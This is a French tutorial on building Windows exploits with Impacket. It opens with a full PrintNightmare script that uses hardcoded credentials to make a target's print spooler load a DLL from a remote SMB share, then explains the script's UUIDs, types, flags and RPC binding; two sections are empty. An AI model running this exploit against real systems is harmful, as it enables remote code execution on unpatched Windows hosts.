Impacket est une des suites d'outils les plus utilisés quand il s'agit de faire du pentest sur un réseau et sur un environnement windows du à son large choix de protocoles disponibles ainsi que ses méthodes d'attaques.
Mais beaucoup de personnes se limites aux outils présent dans impacket, aujourd'hui nous allons voir comment on peux developper un exploit contre windows via Impacket et python en analysant des implémentations.

Prerequis : 
- Bonne bases en réseau et Windows
- Savoir programmer en python

A l'avenir, si vous voulez developper des outils via impacket il faudras vous familiariser avec la documentation microsoft.

# I - Cas d'étude : Implémentation MS-PAR pour PrintNightmare :

```python
#!/usr/bin/python3
from impacket.dcerpc.v5 import par, rpcrt, epm
from impacket.dcerpc.v5.transport import DCERPCTransportFactory
from impacket.dcerpc.v5.dtypes import ULONGLONG, UINT, USHORT, LPWSTR, DWORD, ULONG, NULL
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT, NDRUNION, NDRPOINTER, NDRUniConformantArray
from impacket.uuid import uuidtup_to_bin, string_to_bin
from impacket import system_errors
from impacket.dcerpc.v5.rpcrt import DCERPCException

MSRPC_UUID_PAR = uuidtup_to_bin(('76F03F96-CDFD-44FC-A22C-64950A001209', '1.0'))
MSRPC_UUID_WINSPOOL = string_to_bin('9940CA8E-512F-4C58-88A9-61098D6896BD')

APD_STRICT_UPGRADE              = 0x00000001
APD_STRICT_DOWNGRADE            = 0x00000002
APD_COPY_ALL_FILES              = 0x00000004
APD_COPY_NEW_FILES              = 0x00000008
APD_COPY_FROM_DIRECTORY         = 0x00000010
APD_DONT_COPY_FILES_TO_CLUSTER  = 0x00001000
APD_COPY_TO_ALL_SPOOLERS        = 0x00002000
APD_INSTALL_WARNED_DRIVER       = 0x00008000
APD_RETURN_BLOCKING_STATUS_CODE = 0x00010000

class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__( self ):
        key = self.error_code
        if key in system_errors.ERROR_MESSAGES:
            error_msg_short = system_errors.ERROR_MESSAGES[key][0]
            error_msg_verbose = system_errors.ERROR_MESSAGES[key][1] 
            return 'PAR SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
        else:
            return 'PAR SessionError: unknown error code: 0x%x' % self.error_code

class DRIVER_INFO_2(NDRSTRUCT):
    structure = (
        ('cVersion', DWORD),
        ('pName', LPWSTR),
        ('pEnvironment', LPWSTR),
        ('pDriverPath', LPWSTR),
        ('pDataFile', LPWSTR),
        ('pConfigFile', LPWSTR),
    )
	
class PDRIVER_INFO_2(NDRPOINTER):
    referent = (
        ('Data', DRIVER_INFO_2),
    )
   
class DRIVER_INFO_UNION(NDRUNION):
    commonHdr = (
        ('tag', ULONG),
    )
    union = {
        2 : ('Level2', PDRIVER_INFO_2),
    }

class DRIVER_CONTAINER(NDRSTRUCT):
    structure =  (
        ('Level', DWORD),
        ('DriverInfo', DRIVER_INFO_UNION),
    )

class RpcAsyncAddPrinterDriver(NDRCALL):
    opnum = 39
    structure = (
       ('pName', LPWSTR),
       ('pDriverContainer', DRIVER_CONTAINER),
       ('dwFileCopyFlags', DWORD),
    )

class RpcAsyncAddPrinterDriverResponse(NDRCALL):
    structure = (
       ('ErrorCode', ULONG),
    )

pDriverContainer = DRIVER_CONTAINER()
pDriverContainer['Level'] = 2
pDriverContainer['DriverInfo']['tag'] = 2
pDriverContainer['DriverInfo']['Level2']['cVersion']     = 3
pDriverContainer['DriverInfo']['Level2']['pName']        = "1234\x00"
pDriverContainer['DriverInfo']['Level2']['pEnvironment'] = "Windows x64\x00"
pDriverContainer['DriverInfo']['Level2']['pDriverPath']  = "C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL\x00"
pDriverContainer['DriverInfo']['Level2']['pDataFile']    = "\\??\\UNC\\192.168.1.215\\smb\\addCube.dll\x00"
pDriverContainer['DriverInfo']['Level2']['pConfigFile']  = "C:\\Windows\\System32\\winhttp.dll\x00"
dwFileCopyFlags = APD_COPY_ALL_FILES | 0x10 | 0x8000
pName = NULL

request = RpcAsyncAddPrinterDriver()
request['pName'] = pName
request['pDriverContainer'] = pDriverContainer
request['dwFileCopyFlags'] = dwFileCopyFlags

stringbinding = epm.hept_map("192.168.1.99", MSRPC_UUID_PAR, protocol='ncacn_ip_tcp')
rpctransport = DCERPCTransportFactory(stringbinding)
rpctransport.set_credentials("admin", "Summer2018", "", "", "")
dce = rpctransport.get_dce_rpc()
dce.set_auth_level(rpcrt.RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
dce.connect()
dce.bind(MSRPC_UUID_PAR)

request.dump()
resp = dce.request(request, MSRPC_UUID_WINSPOOL)
resp.dump()
```

Pour commencer a comprendre le code il faut déjà comprendre le protocole, MS-PAR est comme MS-RPRN mais il peut fonctionner de manière Asynchrone. Ils fontionne eux 2 via MS-RPCE. 

### I - 1. Gestion d'erreur : 

Avec impacket, on utilise system_errors et DCERPCException de RPCRT (La ou est défini MS-RPCE) pour afficher les erreurs (ERROR HANDLING)
Nous devons initialisé la fonction et ses variables à 0.

### I - 2. UUID :

fontion de conversion représenté ici : https://github.com/SecureAuthCorp/impacket/blob/f057477633fa9caa269eb3ec1c41e2e20abadea1/impacket/uuid.py

l'UUID est utilisé pour représenter une ressource disponible sur les serveurs RPC/MSRPC en l'identifiant via un format unique et très précis. Il est parfois appellé GUID dans le cas de Microsoft.

Le format doit suivre les règles suivantes : 
- Base16 ( hexa )
- 16 octets
- 32 char minuscule + 4 tiret de séparation

![](https://media.discordapp.net/attachments/713142876241920000/934903424938557511/unknown.png)

GUID ( microsoft ) :  *{3259a1a8-9cc4-0000-0000-000000000000}*
UUID : *3259a1a8-9cc4-0000-0000-000000000000*

Aller plus loin sur la compréhension des UUID/GUID : 

![](https://media.discordapp.net/attachments/713142876241920000/934903516697354270/unknown.png)

Impacket utilise EPM.py pour réferéncé les interfaces/protocoles connus ainsi que ses UUID. exemple, *12345678-1234-ABCD-EF00-0123456789AB* correspond à MS-RPRN.
![](https://media.discordapp.net/attachments/713142876241920000/934904392702906458/unknown.png)

pour les 2 UUID de MS-PAR ils sont de version 4, réservé à DCE (Distributed Computing Environment) / DCE/RPC.

![](https://media.discordapp.net/attachments/713142876241920000/934904207507619922/unknown.png?width=719&height=184)

ici, on fais la conversion de *76F03F96-CDFD-44FC-A22C-64950A001209* qui correspond à **MS-PAR** et *9940CA8E-512F-4C58-88A9-61098D6896BD*  qui correspond à **MS-PAR IRemoteWinspool** et plus précisement à l'acceptation des appels RPC.


la fonction uuidtup_to_bin de Impacket va convertir un tuple en quelque chose d'illisble à par pour la machine. pour le premier item, il applique la fonction string_to_bin et le 2ème item il applique stringver_to_bin() qui va split l'item pour les packé dans l'odre Little indian séparement et les recomposer.
si on décompose la concaténation des items :
```c
b'\x96?\xf0v\xfd\xcd\xfcD\xa2,d\x95\n\x00\x12\t\x01\x00\x00\x00'
```
`\x01\x00\x00\x00` est la version et `\x96\xf0v\xfd\xcd\xfcD\xa2,d\x95\n\x00\x12\t` c'est l'UUID en lui meme.

La fonction string_to_bin :

Comparaison de regex :
![](https://media.discordapp.net/attachments/713142876241920000/934904075441557564/unknown.png?width=719&height=52)
la regex d'un UUID est : 
```sd
([\dA-Fa-f]{8})-([\dA-Fa-f]{4})-([\dA-Fa-f]{4})-([\dA-Fa-f]{4})-([\dA-Fa-f]{4})([\dA-Fa-f]{8})
```
La fonction string_to_bin de impacket compare cette regex à l'UUID données via match(), et affiche l'UUID "emballé", cet UUID emballé est séparé en 2 partie suivant la taille d'octet. *partie 1  = uuid1, uuid2, uuid3* et *partie 2 = uuid4, uuid5, uuid6*

la partie 1 est dans l'odre **little indian** et la partie 2, **big endian**. c'est deux parti sont ensuite concaténé.
```python
(uuid1, uuid2, uuid3, uuid4, uuid5, uuid6) = [int(x, 16) for x in matches.groups()]
uuid = pack('<LHH', uuid1, uuid2, uuid3)
uuid += pack('>HHL', uuid4, uuid5, uuid6)
```

à noté que les types C sont souvent des unsigned long ou unsigned short.

### I - 3 : Importation des modules & Flag :

```py
from impacket.dcerpc.v5 import par, rpcrt, epm 
```
pour developper l'exploit contre MS-PAR nous devons forcément importer l'implémentation du protocoles MS-PAR, RPCRT pour MS-RPCE ainsi que EPM mentionné plus haut.

```py
from impacket.dcerpc.v5.transport import DCERPCTransportFactory
```

nous devons absolument importé la fonction DCERPCTransportFactory qui va nous permettre de créer des objets DCE et à créer un transport suivant le protocole. nous ce seras NCACN_IP_TCP pour utiliser la pile TCP/IP donc ce bloc sera executé :
```python
elif 'ncacn_ip_tcp' == ps:
	port = sb.get_endpoint()
	if port:
		rpctransport = TCPTransport(na, int(port))
```


les types :
```py
from impacket.dcerpc.v5.dtypes import ULONGLONG, UINT, USHORT, LPWSTR, DWORD, ULONG, NULL
```
dtypes correspond à l'implémentations de [MS-DTYP](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/3caa4769-b02f-4cee-a857-8496f4395ec1), ici on importe les types C qu'on veut utilisé :

**Wide Character** :  est un type de données dont la taille est généralement supérieure à celle du caractère 8 bits traditionnel.

- **ULONGLONG** : *Unsigned long long*
- **UINT** : *Unsigned int*
- **USHORT** : *Unsigned short*
- **LPWSTR** : *Long Pointer Wide String, c'est un pointeur de 32 bits vers un str de 16 bits*
- **DWORD** : *c'est un Unsigned int de 32 bits*
- **ULONG** : *Unsigned long*
- **NULL** : *valur null*

```python
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT, NDRUNION, NDRPOINTER, NDRUniConformantArray
```




les autres je ne les présentes pas car on en a parlé précedemment.

**les flags :**
```c
APD_STRICT_UPGRADE              = 0x00000001
APD_STRICT_DOWNGRADE            = 0x00000002
APD_COPY_ALL_FILES              = 0x00000004
APD_COPY_NEW_FILES              = 0x00000008
APD_COPY_FROM_DIRECTORY         = 0x00000010
APD_DONT_COPY_FILES_TO_CLUSTER  = 0x00001000
APD_COPY_TO_ALL_SPOOLERS        = 0x00002000
APD_INSTALL_WARNED_DRIVER       = 0x00008000
APD_RETURN_BLOCKING_STATUS_CODE = 0x00010000
```
ces valeurs hexadécimal sont défini dans la doc [microsoft](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/b96cc497-59e5-4510-ab04-5484993b259b) pour MS-PAR 
![](https://media.discordapp.net/attachments/713142876241920000/934903812446105641/unknown.png?width=582&height=566)


### I - 4 : Structure des classes : 


### I - 5 : DRIVER_CONTAINER level :



### I - 6 : Connexion DCE/RPC & RpcAsyncAddPrinterDriver :

la fonction hept_map() de epm.py permetteras de créer un stringbinding.
```python
hept_map("192.168.1.99", MSRPC_UUID_PAR, protocol='ncacn_ip_tcp')
```
ici on défini l'uuid de MS-PAR avec l'hote cible ainsi que le protocol nommé NCACN_IP_TCP qui permet juste de définir et identifier le modèle TCP/IP comme la famille de protocoles pour le endpoint.

NCACN_IP_TCP : 
https://docs.microsoft.com/en-us/windows/win32/midl/ncacn-ip-tcp
https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/95fbfb56-d67a-47df-900c-e263d6031f22

le stringbinding ressembleras à ceci : 
```python
ncacn_ip_tcp:192.168.1.99[51616]
```

![](https://media.discordapp.net/attachments/713142876241920000/934907588091469864/unknown.png)


## CONCLUSION :

Comme vous l'avez vu, ce n'est pas simple si vous devez un jour faire une implémentation d'un protocole windows sans tout re programmer de 0, utiliser impacket et regarder les fonctions disponibles. 
Pour le reste, il faut lire beaucoup de documentation microsoft.
